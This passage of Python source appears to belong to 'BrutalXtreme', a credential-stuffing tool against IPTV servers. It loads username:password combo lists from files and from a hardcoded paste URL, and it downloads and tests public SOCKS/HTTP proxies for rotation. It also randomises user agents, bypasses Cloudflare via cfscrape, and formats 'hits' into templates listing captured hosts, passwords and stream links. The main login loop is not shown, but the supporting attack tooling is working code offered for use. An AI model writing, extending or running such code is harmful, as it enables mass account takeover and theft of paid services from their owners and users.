        choice = int(input(f"\n{c('AZUL_CELESTE')}{tr('prompt_rename_which')} {c('RESET')}").strip())
        if 1 <= choice <= len(online_combos):
            old_name = online_combos[choice-1]['name']
            new_name = input(f"{c('AZUL_CELESTE')}{tr('prompt_new_name', old_name)} {c('RESET')}").strip()
            if new_name:
                CONFIG["online_combos"][choice-1]["name"] = new_name
                save_config(CONFIG)
                print(f"\n{c('VERDE_ESMERALDA')}{tr('combo_renamed_success')}{c('RESET')}")
            else: print(f"\n{c('RED')}{tr('name_not_empty')}{c('RESET')}")
        else: print(f"\n{c('RED')}{tr('invalid_selection')}{c('RESET')}")
    except (ValueError, IndexError): print(f"\n{c('RED')}{tr('invalid_input')}{c('RESET')}")
    time.sleep(2)
def delete_online_combo():
    online_combos = CONFIG.get("online_combos", [])
    if not online_combos: print(f"\n{c('RED')}{tr('no_combos_delete')}{c('RESET')}"); time.sleep(2); return
    try:
        choice = int(input(f"\n{c('AZUL_CELESTE')}{tr('prompt_delete_which')} {c('RESET')}").strip())
        if 1 <= choice <= len(online_combos):
            combo = CONFIG["online_combos"].pop(choice-1)
            save_config(CONFIG)
            print(f"\n{c('VERDE_ESMERALDA')}{tr('combo_deleted_success', combo['name'])}{c('RESET')}")
        else: print(f"\n{c('RED')}{tr('invalid_selection')}{c('RESET')}")
    except (ValueError, IndexError): print(f"\n{c('RED')}{tr('invalid_input')}{c('RESET')}")
    time.sleep(2)
def show_layout_tutorial():
    clear(); print_banner()
    print(f"\n{c('AZUL_ROYAL')}--- {c('BOLD')}{tr('tutorial_title')} ---{c('RESET')}")
    print(f"\n{c('AMARELO_OURO')}{tr('tutorial_intro')}{c('RESET')}")
    print(f"\n  {c('CIANO')}{c('BOLD')}{tr('tutorial_step1_title')}{c('RESET')} {tr('tutorial_step1_desc')}")
    print(f"  {c('CIANO')}{c('BOLD')}{tr('tutorial_step2_title')}{c('RESET')} {tr('tutorial_step2_desc')}")
    print(f"  {c('CIANO')}{c('BOLD')}{tr('tutorial_step3_title')}{c('RESET')} {tr('tutorial_step3_desc')}")
    print(f"  {c('CIANO')}{c('BOLD')}{tr('tutorial_step4_title')}{c('RESET')} {tr('tutorial_step4_desc')}")
    print(f"\n  {c('BRANCO')}{tr('tutorial_conclusion')}{c('RESET')}")
    print(f"\n{c('AZUL_ROYAL')}--- {c('BOLD')}{tr('tutorial_example_title')} ---{c('RESET')}")
    print(f"{c('CINZA_MEDIO')}{tr('tutorial_example_content')}{c('RESET')}")
    print(f"\n{c('AZUL_ROYAL')}--- {c('BOLD')}{tr('placeholders_help_title')} ---{c('RESET')}")
    placeholders = {
        "{host}": tr("ph_host"), "{porta}": tr("ph_porta"), "{usuario}": tr("ph_usuario"), "{senha}": tr("ph_senha"), "{ip_host}": tr("ph_ip_host"),
        "{regiao}": tr("ph_regiao"), "{isp}": tr("ph_isp"), "{status}": tr("ph_status"), "{criada_data}": tr("ph_criada_data"),
        "{criada_completa}": tr("ph_criada_completa"), "{expira_data}": tr("ph_expira_data"), "{expira_completa}": tr("ph_expira_completa"), "{dias_restantes}": tr("ph_dias_restantes"),
        "{conexoes_ativas}": tr("ph_conexoes_ativas"), "{conexoes_max}": tr("ph_conexoes_max"), "{canais}": tr("ph_canais"), "{filmes}": tr("ph_filmes"), "{series}": tr("ph_series"),
        "{total_vod}": tr("ph_total_vod"), "{conteudo_adulto}": tr("ph_conteudo_adulto"), "{link_m3u}": tr("ph_link_m3u"), "{link_epg}": tr("ph_link_epg"),
        "{nickname}": tr("ph_nickname"), "{combo_nome}": tr("ph_combo_nome"), "{data}": tr("ph_data"), "{hora}": tr("ph_hora"),
    }
    for key, value in placeholders.items(): print(f"{c('VERDE_LIMAO')}{key:<20} {c('RESET')} {c('BRANCO')} {value}{c('RESET')}")
    input(f"\n{c('CINZA_MEDIO')}{tr('press_enter_continue')}{c('RESET')}")
def manage_layouts_menu():
    while True:
        clear(); print_banner()
        layouts = load_layouts()
        print(f"\n{c('AZUL_ROYAL')}--- {c('BOLD')}{tr('layout_manager_title')} ---{c('RESET')}")
        for i, layout in enumerate(layouts, 1):
            is_default = " " + c('AMARELO_OURO') + tr('current_default_indicator') + c('RESET') if layout['nome_display'] == CONFIG.get('default_layout') else ""
            print(f"  [{c('VERDE_LIMAO')}{i}{c('RESET')}] {layout['nome_display']}{is_default}")
        print("\n" + "="*40)
        print(f"[{c('VERDE_LIMAO')}I{c('RESET')}] {c('BOLD')}{tr('import_layout_menu')}{c('RESET')}")
        print(f"[{c('VERDE_LIMAO')}R{c('RESET')}] {tr('rename_layout')}")
        print(f"[{c('VERDE_LIMAO')}E{c('RESET')}] {tr('delete_layout')}")
        print(f"[{c('VERDE_LIMAO')}D{c('RESET')}] {tr('set_default_layout')}")
        print(f"[{c('VERDE_LIMAO')}T{c('RESET')}] {tr('tutorial_title')}")
        print(f"[{c('VERDE_LIMAO')}V{c('RESET')}] {tr('back')}")
        choice = input(f"\n{c('LARANJA')}» {c('RESET')}").strip().upper()
        if choice == 'I': import_layout_from_file()
        elif choice == 'R': rename_layout()
        elif choice == 'E': delete_layout()
        elif choice == 'D': set_default_layout()
        elif choice == 'T': show_layout_tutorial()
        elif choice == 'V': return
def set_default_layout():
    layouts = load_layouts()
    clear(); print_banner()
    print(f"\n{c('AZUL_ROYAL')}--- {c('BOLD')}{tr('set_default_layout_title')} ---{c('RESET')}")
    current_default = CONFIG.get('default_layout')
    for i, layout in enumerate(layouts, 1):
        is_default = " " + c('AMARELO_OURO') + tr('current_default_indicator') + c('RESET') if layout['nome_display'] == current_default else ""
        print(f"  [{c('VERDE_LIMAO')}{i}{c('RESET')}] {layout['nome_display']}{is_default}")
    try:
        choice_str = input(f"\n{c('AZUL_CELESTE')}{tr('prompt_select_new_default')}{c('RESET')} ").strip()
        if not choice_str: return
        choice = int(choice_str)
        if 1 <= choice <= len(layouts):
            new_default_name = layouts[choice - 1]['nome_display']
            CONFIG['default_layout'] = new_default_name
            save_config(CONFIG)
            print(f"\n{c('VERDE_ESMERALDA')}{tr('default_layout_set_success', new_default_name)}{c('RESET')}")
        else: print(f"\n{c('RED')}{tr('invalid_selection')}{c('RESET')}")
    except (ValueError, IndexError): print(f"\n{c('RED')}{tr('invalid_input')}{c('RESET')}")
    time.sleep(2)
def get_all_placeholders():
    return {
        "{host}", "{porta}", "{usuario}", "{senha}", "{ip_host}", "{regiao}", "{isp}", "{status}",
        "{criada_data}", "{criada_completa}", "{expira_data}", "{expira_completa}", "{dias_restantes}",
        "{conexoes_ativas}", "{conexoes_max}", "{canais}", "{filmes}", "{series}", "{total_vod}",
        "{conteudo_adulto}", "{link_m3u}", "{link_epg}", "{nickname}", "{combo_nome}", "{data}", "{hora}"
    }
def analyze_layout_template(template_lines):
    all_valid_placeholders = get_all_placeholders()
    template_text = "\n".join(template_lines)
    found_placeholders = set(re.findall(r'({[\w_]+})', template_text))
    
    recognized = found_placeholders.intersection(all_valid_placeholders)
    invalid = found_placeholders.difference(all_valid_placeholders)
    missing = all_valid_placeholders.difference(found_placeholders)
    
    return sorted(list(recognized)), sorted(list(missing)), sorted(list(invalid))
def import_layout_from_file():
    clear(); print_banner()
    print(f"\n{c('AZUL_ROYAL')}--- {c('BOLD')}{tr('import_layout_title')} ---{c('RESET')}")
    
    try:
        import_files = [f for f in os.listdir(LAYOUTS_IMPORT_DIR) if f.endswith('.txt')]
        if not import_files:
            print(f"\n{c('AMARELO_OURO')}{tr('no_import_files', LAYOUTS_IMPORT_DIR)}{c('RESET')}")
            input(f"\n{c('CINZA_MEDIO')}{tr('press_enter_continue')}{c('RESET')}"); return
    except FileNotFoundError:
        print(f"\n{c('RED')}Erro: A pasta '{LAYOUTS_IMPORT_DIR}' não foi encontrada.{c('RESET')}")
        input(f"\n{c('CINZA_MEDIO')}{tr('press_enter_continue')}{c('RESET')}"); return

    for i, filename in enumerate(import_files, 1):
        print(f"  [{c('VERDE_LIMAO')}{i}{c('RESET')}] {filename}")
    
    try:
        choice = int(input(f"\n{c('LARANJA')}{tr('select_import_file')}{c('RESET')} ").strip())
        if not (1 <= choice <= len(import_files)):
            print(f"\n{c('RED')}{tr('invalid_selection')}{c('RESET')}"); time.sleep(2); return
        
        selected_file = import_files[choice - 1]
        layout_name = os.path.splitext(selected_file)[0]
        filepath = os.path.join(LAYOUTS_IMPORT_DIR, selected_file)

        with open(filepath, 'r', encoding='utf-8') as f:
            template_lines = [line.strip('\n\r') for line in f.readlines()]

        if not template_lines:
            print(f"\n{c('RED')}{tr('layout_model_empty')}{c('RESET')}"); time.sleep(2); return

        clear(); print_banner()
        recognized, missing, invalid = analyze_layout_template(template_lines)
        
        print(f"\n{c('AZUL_ROYAL')}{tr('layout_analysis_title', selected_file)}{c('RESET')}")
        print(f"\n{c('VERDE_LIMAO')}{tr('recognized_placeholders', len(recognized))}{c('RESET')}")
        print(c('BRANCO') + ", ".join(recognized))
        if invalid:
            print(f"\n{c('RED')}{tr('invalid_placeholders', len(invalid))}{c('RESET')}")
            print(c('CINZA_MEDIO') + ", ".join(invalid))
        if missing:
            print(f"\n{c('AMARELO_OURO')}{tr('missing_placeholders', len(missing))}{c('RESET')}")
            print(c('CINZA_MEDIO') + ", ".join(missing))
        
        preview_ok = False
        try:
            show_layout_preview(template_lines)
            preview_ok = True
        except (ValueError, KeyError):
            print(f"\n{c('RED')}{c('BOLD')}{tr('preview_error_title')}{c('RESET')}")
            print(f"{c('AMARELO_OURO')}{tr('preview_error_desc')}{c('RESET')}")

        lang_confirm_map = {"pt": "S", "en": "Y", "es": "S"}
        lang_confirm = lang_confirm_map.get(CONFIG.get("language", "pt"), "S")
        confirm_msg_key = 'confirm_save_anyway'
        if preview_ok:
            confirm_msg_key = 'layout_confirm_correct'
        
        confirm = input(f"\n{c('AMARELO_OURO')}{tr(confirm_msg_key)} {c('RESET')}").strip().upper()
        
        if confirm == lang_confirm:
            layouts = load_layouts()
            layouts = [l for l in layouts if l['nome_display'] != layout_name]
            layouts.append({"nome_display": layout_name, "template": template_lines})
            save_layouts(layouts)
            print(f"\n{c('VERDE_ESMERALDA')}{tr('layout_saved_success', layout_name)}{c('RESET')}")
        else:
            print(f"\n{c('RED')}{tr('layout_import_cancelled')}{c('RESET')}")

    except (ValueError, IndexError):
        print(f"\n{c('RED')}{tr('invalid_input')}{c('RESET')}")
    
    time.sleep(3)

def rename_layout():
    layouts = load_layouts()
    if not layouts: return
    try:
        for i, layout in enumerate(layouts, 1):
            print(f"  [{c('VERDE_LIMAO')}{i}{c('RESET')}] {layout['nome_display']}")
        choice = int(input(f"\n{c('AZUL_CELESTE')}{tr('prompt_rename_which')} {c('RESET')}").strip())
        if 1 <= choice <= len(layouts):
            old_name = layouts[choice-1]['nome_display']
            new_name = input(f"{c('AZUL_CELESTE')}{tr('prompt_new_name', old_name)} {c('RESET')}").strip()
            if new_name:
                if old_name == CONFIG.get('default_layout'): CONFIG['default_layout'] = new_name
                layouts[choice-1]["nome_display"] = new_name
                save_layouts(layouts); save_config(CONFIG)
                print(f"\n{c('VERDE_ESMERALDA')}{tr('layout_renamed_success')}{c('RESET')}")
            else: print(f"\n{c('RED')}{tr('name_not_empty')}{c('RESET')}")
        else: print(f"\n{c('RED')}{tr('invalid_selection')}{c('RESET')}")
    except (ValueError, IndexError): print(f"\n{c('RED')}{tr('invalid_input')}{c('RESET')}")
    time.sleep(2)
def delete_layout():
    layouts = load_layouts()
    if not layouts: return
    try:
        for i, layout in enumerate(layouts, 1):
            print(f"  [{c('VERDE_LIMAO')}{i}{c('RESET')}] {layout['nome_display']}")
        choice_str = input(f"\n{c('AZUL_CELESTE')}{tr('prompt_delete_which')} {c('RESET')}").strip()
        if not choice_str.isdigit(): print(f"\n{c('RED')}{tr('invalid_input')}{c('RESET')}"); time.sleep(2); return
        choice = int(choice_str)
        if 1 <= choice <= len(layouts):
            layout = layouts.pop(choice-1)
            save_layouts(layouts)
            if layout['nome_display'] == CONFIG.get('default_layout'):
                CONFIG['default_layout'] = ""
                save_config(CONFIG)
            print(f"\n{c('VERDE_ESMERALDA')}{tr('layout_deleted_success', layout['nome_display'])}{c('RESET')}")
        else: print(f"\n{c('RED')}{tr('invalid_selection')}{c('RESET')}")
    except (ValueError, IndexError): print(f"\n{c('RED')}{tr('invalid_input')}{c('RESET')}")
    time.sleep(2)
def show_layout_preview(template_lines):
    now = datetime.datetime.now(); exp = now + datetime.timedelta(days=30)
    dummy_data = {
        "host": "http://servidor.exemplo:8080", "porta": "8080", "usuario": "teste123", "senha": "password", "ip_host": "123.45.67.89", "regiao": "Exemplo 🇨🇦", "isp": "Provedor Exemplo",
        "status": "Online", "criada_data": now.strftime('%d/%m/%Y'), "criada_completa": now.strftime('%H:%M:%S - %d/%m/%Y'), "expira_data": exp.strftime('%d/%m/%Y'),
        "expira_completa": exp.strftime('%H:%M:%S - %d/%m/%Y'), "dias_restantes": "30", "conexoes_ativas": "1", "conexoes_max": "2", "canais": "5000", "filmes": "10000",
        "series": "2000", "total_vod": "17000", "conteudo_adulto": "Sim", "link_m3u": "http://servidor.exemplo:8080/get.php?username=...", "link_epg": "http://servidor.exemplo:8080/xmltv.php?username=...",
        "nickname": "SeuNick", "combo_nome": "ComboExemplo", "data": now.strftime('%d/%m/%Y'), "hora": now.strftime('%H:%M:%S'),
    }
    print(f"\n{c('CIANO')}{tr('layout_preview_title')}{c('RESET')}"); preview_text = "\n".join(template_lines)
    print(preview_text.format_map(defaultdict(lambda: 'N/A', **dummy_data)))
    print(f"{c('CIANO')}" + "-" * (len(tr('layout_preview_title')) + 6) + c('RESET'))
NOME = 'BrutalXtreme'
PREDEFINED_COMBO_ONLINE_URL = "http://pt.textbin.net/raw/7ybrlxsbe9"
PROXY_SOURCES = {
    'socks5': ["https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5", "https://www.proxy-list.download/api/v1/get?type=socks5", "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt"],
    'socks4': ["https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4", "https://www.proxy-list.download/api/v1/get?type=socks4"],
    'http': ["https://api.proxyscrape.com/v2/?request=getproxies&protocol=http", "https://www.proxy-list.download/api/v1/get?type=http"]
}
if sys.platform.startswith('win'):
    import ctypes
    ctypes.windll.kernel32.SetConsoleTitleW(NOME)
else: sys.stdout.write(f'\033]2;{NOME}\007')

stats_lock = threading.Lock(); display_lock = threading.Lock(); hit_file_lock = threading.Lock(); dns_cache_lock = threading.Lock()
scan_active = False; dns_cache = {}; proxy_check_active, checked_proxies_count, online_proxies_list = False, 0, []
proxy_check_lock = threading.Lock(); checked_count = 0; hit_count = 0; bad_count = 0; error_count = 0; cpm = 0
scan_start_time = None; server_hit_counts = {}; server_statuses = {}; last_check_report = ""; last_used_proxy = ""
server_progress_counts = {}
VALID_HITS = set(); ORDERED_HITS_BY_SERVER = defaultdict(list)  
logging.captureWarnings(True)
def create_directories():
    for path in [HITS_DIR, COMBO_DIR, LOCAL_PROXY_DIR, SERVERS_DIR, BRUTAL_DIR, ORDERED_HITS_DIR, LAYOUTS_IMPORT_DIR]:
        try: pathlib.Path(path).mkdir(parents=True, exist_ok=True)
        except Exception as e: print(f"{c('RED')}{c('BOLD')}Erro crítico ao criar o diretório {path}: {e}{c('RESET')}"); sys.exit(1)
def format_duration(seconds):
    h, m, s = int(seconds // 3600), int((seconds % 3600) // 60), int(seconds % 60)
    return f"{h:02}:{m:02}:{s:02}"
def get_random_user_agent():
    return random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    ])
class Proxies:
    def __init__(self): self.proxies = []; self.proxy_type = None; self.lock = threading.Lock()
    def load_proxies(self, proxy_list, p_type):
        with self.lock: self.proxies = proxy_list; self.proxy_type = p_type
        return bool(self.proxies)
    def get_random_proxy(self):
        global last_used_proxy
        with self.lock:
            if not self.proxies: return None
            p = random.choice(self.proxies); last_used_proxy = p
            p_type_str = self.proxy_type if self.proxy_type == 'http' else f"{self.proxy_type}h"
            return {'http': f'{p_type_str}://{p}', 'https': f'{p_type_str}://{p}'}
proxy_handler = Proxies()
def get_session():
    return cfscrape.create_scraper() if CFSCRAPE_AVAILABLE else requests.Session()
def proxy_check_worker(proxy_chunk, proxy_type):
    global checked_proxies_count, online_proxies_list
    session = requests.Session()
    for proxy in proxy_chunk:
        if not proxy_check_active: break
        proxies_dict = {p: f"{proxy_type}://{proxy}" for p in ['http', 'https']}
        try:
            res = session.get("http://ip-api.com/json", proxies=proxies_dict, timeout=5, verify=False)
            if res.status_code == 200 and "query" in res.json():
                with proxy_check_lock: online_proxies_list.append(proxy)
        except Exception: pass
        finally:
            with proxy_check_lock: checked_proxies_count += 1
def display_proxy_check_progress(total_proxies):
    while proxy_check_active:
        with display_lock:
            clear(); print_banner()
            print(f"{c('MAGENTA')}\n--- {c('BOLD')}{tr('proxy_checking')} ---{c('RESET')}")
            progress = (checked_proxies_count / total_proxies) * 100 if total_proxies > 0 else 0
            print(f"{c('CIANO')}{tr('proxy_checked', checked_proxies_count, total_proxies, f'{progress:.1f}')}{c('RESET')}")
            print(f"{c('VERDE_LIMAO')}{tr('proxy_online_found', len(online_proxies_list))}{c('RESET')}")
            print(f"{c('AZUL_CELESTE')}{tr('proxy_bots')}{c('RESET')}")
        time.sleep(0.5)
def check_and_filter_proxies(raw_proxies, proxy_type):
    global proxy_check_active, checked_proxies_count, online_proxies_list
    unique_proxies = sorted(list(set(raw_proxies)))
    total_to_check = len(unique_proxies)
    if total_to_check == 0: return []
    checked_proxies_count, online_proxies_list, proxy_check_active = 0, [], True
    PROXY_CHECKER_BOTS = 100
    chunk_size = (total_to_check + PROXY_CHECKER_BOTS - 1) // PROXY_CHECKER_BOTS or 1
    chunks = [unique_proxies[i:i + chunk_size] for i in range(0, total_to_check, chunk_size)]
    display_thread = threading.Thread(target=display_proxy_check_progress, args=(total_to_check,), daemon=True); display_thread.start()
    threads = [threading.Thread(target=proxy_check_worker, args=(chunk, proxy_type), daemon=True) for chunk in chunks]
    for t in threads: t.start()
    for t in threads: t.join()
    proxy_check_active = False; time.sleep(0.6); clear(); print_banner()
    print(f"\n{c('VERDE_ESMERALDA')}{tr('proxy_check_complete', len(online_proxies_list), total_to_check)}{c('RESET')}")
    return online_proxies_list
def carregar_proxies_online(proxy_type):
    if proxy_type not in PROXY_SOURCES: return []
    urls = PROXY_SOURCES[proxy_type]; todos_proxies = set(); headers = {'User-Agent': get_random_user_agent()}
    print(f"\n{c('CIANO')}{tr('proxy_downloading', proxy_type.upper())}{c('RESET')}")
    for url in urls:
        print(f"{c('AMARELO_OURO')}{tr('proxy_source_download', url)}{c('RESET')}")
        content = ""
        try:
            response = requests.get(url, headers=headers, timeout=15, verify=False)
            if response.status_code == 200: content = response.text
        except Exception: pass
        if not content:
            try:
                req = urllib.request.Request(url, headers=headers)
                with urllib.request.urlopen(req, timeout=20) as response_urllib:
                    if response_urllib.getcode() == 200: content = response_urllib.read().decode('utf-8', errors='ignore')
            except Exception: print(f"{c('RED')}{tr('proxy_source_fail', url)}{c('RESET')}"); continue
        proxies_desta_fonte = {line.strip() for line in content.splitlines() if ':' in line.strip() and not line.strip().startswith("#")}
        print(f"{c('VERDE_LIMAO')}{tr('proxy_source_found', len(proxies_desta_fonte))}{c('RESET')}"); todos_proxies.update(proxies_desta_fonte)
    print(f"\n{c('VERDE_ESMERALDA')}{tr('proxy_download_complete', len(todos_proxies))}{c('RESET')}"); time.sleep(2)
    return list(todos_proxies)
def configure_proxy(current_step, total_steps):
    print(f"\n{c('CIANO')}--- [{current_step}/{total_steps}] {c('BOLD')}{tr('proxy_title')} ---{c('RESET')}")
    print(f"\n[{c('VERDE_LIMAO')}1{c('RESET')}] {tr('proxy_online_option')}"); print(f"[{c('VERDE_LIMAO')}2{c('RESET')}] {tr('proxy_local_option')}"); print(f"[{c('VERDE_LIMAO')}0{c('RESET')}] {tr('proxy_no_use_option')}")
    choice = input(f"\n{c('LARANJA')}» {c('RESET')}").strip()
    proxy_type, raw_proxies = None, []
    if choice == '1':
        print(f"\n{c('CIANO')}--- {tr('proxy_online_title')} ---{c('RESET')}"); print(f"\n{tr('proxy_online_prompt')}")
        print(f"  [{c('VERDE_LIMAO')}1{c('RESET')}] HTTP"); print(f"  [{c('VERDE_LIMAO')}2{c('RESET')}] SOCKS4"); print(f"  [{c('VERDE_LIMAO')}3{c('RESET')}] SOCKS5 (Recomendado)")
        type_choice = input(f"\n{c('LARANJA')}» {c('RESET')}").strip()
        type_map = {'1': 'http', '2': 'socks4', '3': 'socks5'}; proxy_type = type_map.get(type_choice)
        if not proxy_type: print(f"{c('RED')}{tr('invalid_option')}{c('RESET')}"); return False, None
        raw_proxies = carregar_proxies_online(proxy_type)
    elif choice == '2':
        proxy_files = [f for f in os.listdir(LOCAL_PROXY_DIR) if f.endswith('.txt')]
        if not proxy_files: print(f"{c('RED')}{tr('proxy_no_files', LOCAL_PROXY_DIR)}{c('RESET')}"); time.sleep(2); return False, None
        print(f"{c('AZUL_CELESTE')}{tr('proxy_files')}{c('RESET')}")
        for i, filename in enumerate(proxy_files, 1): print(f"  [{c('VERDE_LIMAO')}{i}{c('RESET')}] {filename}")
        file_choice = input(f"{c('LARANJA')}{tr('proxy_select_file')}{c('RESET')}").strip()
        if file_choice.isdigit() and 0 < int(file_choice) <= len(proxy_files):
            filepath = os.path.join(LOCAL_PROXY_DIR, proxy_files[int(file_choice) - 1])
            try:
                with open(filepath, 'r', errors='ignore') as f: raw_proxies = [line.strip() for line in f if line.strip()]
                if raw_proxies:
                    print(f"\n{c('CIANO')}{tr('proxy_type_question')}{c('RESET')}"); proxy_types = ['http', 'socks4', 'socks5']
                    for i, p_type in enumerate(proxy_types, 1): print(f"  [{c('VERDE_LIMAO')}{i}{c('RESET')}] {p_type.upper()}")
                    type_choice = input(f"{c('LARANJA')}» {c('RESET')}").strip()
                    if type_choice.isdigit() and 1 <= int(type_choice) <= 3: proxy_type = proxy_types[int(type_choice) - 1]
                    else: print(f"{c('RED')}{tr('proxy_invalid_type')}{c('RESET')}"); return False, None
            except Exception as e: print(f"{c('RED')}{tr('proxy_file_error', e)}{c('RESET')}"); return False, None
        else: print(f"{c('RED')}{tr('proxy_invalid_selection')}{c('RESET')}"); return False, None
    elif choice == '0': return False, None
    else: print(f"{c('RED')}{tr('invalid_option')}{c('RESET')}"); return False, None
    if raw_proxies and proxy_type:
        lang_confirm_map = {"pt": "s", "en": "y", "es": "s"}
        lang_confirm = lang_confirm_map.get(CONFIG.get("language", "pt"), "s")
        if input(f"\n{c('AMARELO_OURO')}{tr('proxy_check_question')}{c('RESET')}").strip().lower() == lang_confirm:
            online_proxies = check_and_filter_proxies(raw_proxies, proxy_type)
            if proxy_handler.load_proxies(online_proxies, proxy_type): return True, proxy_type
        else:
            if proxy_handler.load_proxies(list(set(raw_proxies)), proxy_type): return True, proxy_type
    return False, None
def carregar_combo_online(url):
    print(f"{c('CIANO')}{tr('combo_downloading')}{c('RESET')}"); headers = {'User-Agent': get_random_user_agent()}
    try:
        response = requests.get(url, headers=headers, timeout=15, verify=False)
        if response.status_code == 200:
            lines = [line.strip() for line in response.text.splitlines() if ':' in line]
            if lines:
                print(f"{c('VERDE_LIMAO')}{tr('combo_download_success')}{c('RESET')}"); print(f"{c('AZUL_CELESTE')}{tr('combo_total_accounts', len(lines))}{c('RESET')}")
                return lines
    except Exception: pass
    try:
        print(f"{c('AMARELO_OURO')}{tr('combo_downloading_wait')}{c('RESET')}"); req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=30) as response_urllib:
            if response_urllib.getcode() == 200:
                content = response_urllib.read().decode('utf-8', errors='ignore')
                lines = [line.strip() for line in content.splitlines() if ':' in line]
                if not lines: print(f"{c('RED')}{tr('combo_empty')}{c('RESET')}"); return None
                print(f"{c('VERDE_LIMAO')}{tr('combo_download_success')}{c('RESET')}"); print(f"{c('AZUL_CELESTE')}{tr('combo_total_accounts', len(lines))}{c('RESET')}")
                return lines
            else: print(f"{c('RED')}{tr('combo_http_error', response_urllib.getcode())}{c('RESET')}"); return None
    except Exception as e: print(f"\n{c('RED')}{tr('combo_download_fail', str(e))}{c('RESET')}"); return None
    print(f"\n{c('RED')}{tr('combo_online_failed')}{c('RESET')}"); return None
def _select_online_combo():
    while True:
        clear(); print_banner(); print(f"\n{c('CIANO')}--- {c('BOLD')}{tr('online_combos_menu').upper()} ---{c('RESET')}")
        options_map = []; option_number = 1
        saved_online_combos = CONFIG.get("online_combos", [])
        if saved_online_combos:
            print(f"\n{c('AZUL_CELESTE')}--- {tr('online_saved_section')} ---{c('RESET')}")
            for combo in saved_online_combos:
                print(f"[{c('VERDE_LIMAO')}{option_number}{c('RESET')}] {combo['name']}")
                options_map.append({'type': 'online_saved', 'data': combo}); option_number += 1
        print(f"\n{c('AZUL_CELESTE')}--- {tr('other_online_options')} ---{c('RESET')}"); print(f"[{c('VERDE_LIMAO')}{option_number}{c('RESET')}] {tr('combo_online_default')}")
        options_map.append({'type': 'online_default', 'data': PREDEFINED_COMBO_ONLINE_URL}); option_number += 1
        print(f"[{c('VERDE_LIMAO')}{option_number}{c('RESET')}] {tr('insert_temp_url')}"); options_map.append({'type': 'online_temp', 'data': None}); option_number += 1
        print(f"\n{c('AZUL_CELESTE')}---{c('RESET')}"); print(f"[{c('VERDE_LIMAO')}{option_number}{c('RESET')}] {tr('back')}"); options_map.append({'type': 'back', 'data': None})
        choice_str = input(f"{c('LARANJA')}» {c('RESET')}").strip()
        try:
            choice_int = int(choice_str)
            if 1 <= choice_int <= len(options_map):
                selected = options_map[choice_int - 1]; lines, combo_name = None, None
                if selected['type'] == 'online_saved': combo_name = f"{selected['data']['name']}"; lines = carregar_combo_online(selected['data']['url'])
                elif selected['type'] == 'online_default': combo_name = "Combo_Online_Padrao"; lines = carregar_combo_online(selected['data'])
                elif selected['type'] == 'online_temp':
                    url = input(f"{c('LARANJA')}URL » {c('RESET')}").strip()
                    if url.startswith(('http://', 'https://')): combo_name = "Combo_Temporario"; lines = carregar_combo_online(url)
                    else: print(f"{c('RED')}{tr('combo_invalid_url')}{c('RESET')}"); time.sleep(2); continue
                elif selected['type'] == 'back': return None, None
                if lines: return list(set(lines)), combo_name
                else: print(f"{c('RED')}{tr('combo_online_failed')}{c('RESET')}"); time.sleep(3); continue
            else: print(f"{c('RED')}{tr('invalid_selection')}{c('RESET')}"); time.sleep(2)
        except ValueError: print(f"{c('RED')}{tr('invalid_selection')}{c('RESET')}"); time.sleep(2)
def _select_local_combos():
    while True:
        local_files = [f for f in os.listdir(COMBO_DIR) if f.endswith('.txt')]
        if not local_files:
            print(f"\n{c('RED')}{tr('no_combo_files_found', COMBO_DIR)}{c('RESET')}")
            input(f"\n{c('CINZA_MEDIO')}{tr('press_enter_continue')}{c('RESET')}")
            return None, None

        print(f"\n{c('AZUL_CELESTE')}{tr('combo_files_found', COMBO_DIR)}{c('RESET')}")
        for i, filename in enumerate(local_files, 1):
            print(f"[{c('VERDE_LIMAO')}{i}{c('RESET')}] {filename}")

        choice_str = input(f"\n{c('LARANJA')}{tr('combo_select_prompt')}{c('RESET')} ").strip()
        
        try:
            indices = [int(n.strip()) for n in choice_str.split(',') if n.strip()]
            if not indices or not all(1 <= idx <= len(local_files) for idx in indices):
                print(f"\n{c('RED')}{tr('invalid_selection')}{c('RESET')}"); time.sleep(2); continue

            all_lines = set()
            selected_names = []
            for idx in indices:
                combo_name = local_files[idx - 1]
                selected_names.append(combo_name.replace('.txt', ''))
                filepath = os.path.join(COMBO_DIR, combo_name)
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = {line.strip() for line in f if ':' in line.strip()}
                    all_lines.update(lines)
            
            final_lines = list(all_lines)
            combo_display_name = ", ".join(selected_names)
            return final_lines, combo_display_name
        
        except (ValueError, IndexError):
            print(f"\n{c('RED')}{tr('invalid_selection')}{c('RESET')}"); time.sleep(2)
def configure_combo_for_server(server_url):
    combo_lines = set()
    combo_names = []
    sources_count = 0
    
    while sources_count < 3:
        clear(); print_banner()
        print(f"\n{c('AZUL_ROYAL')}--- {tr('combo_assembly_title', server_url)} ---{c('RESET')}")
        print(f"{c('CIANO')}{tr('current_lines', len(combo_lines))}{c('RESET')}")
        
        print(f"\n[{c('VERDE_LIMAO')}1{c('RESET')}] {tr('add_from_local')}")
        print(f"[{c('VERDE_LIMAO')}2{c('RESET')}] {tr('add_from_online')}")
        print(f"[{c('VERDE_LIMAO')}3{c('RESET')}] {tr('finish_combo_assembly')}")
        
        choice = input(f"\n{c('LARANJA')}» {c('RESET')}").strip()

        if choice == '1':
            new_lines, new_name = _select_local_combos()
            if new_lines:
                original_count = len(combo_lines)
                combo_lines.update(new_lines)
                if new_name not in combo_names: combo_names.append(new_name)
                print(f"\n{c('VERDE_ESMERALDA')}{tr('lines_added', len(combo_lines) - original_count)}{c('RESET')}")
                sources_count += 1
                time.sleep(1.5)
        elif choice == '2':
            new_lines, new_name = _select_online_combo()
            if new_lines:
                original_count = len(combo_lines)
                combo_lines.update(new_lines)
                if new_name not in combo_names: combo_names.append(new_name)
                print(f"\n{c('VERDE_ESMERALDA')}{tr('lines_added', len(combo_lines) - original_count)}{c('RESET')}")
                sources_count += 1
                time.sleep(1.5)
        elif choice == '3':
            if not combo_lines:
                print(f"\n{c('RED')}{tr('add_combos_first')}{c('RESET')}"); time.sleep(2)
                continue
            break
        else:
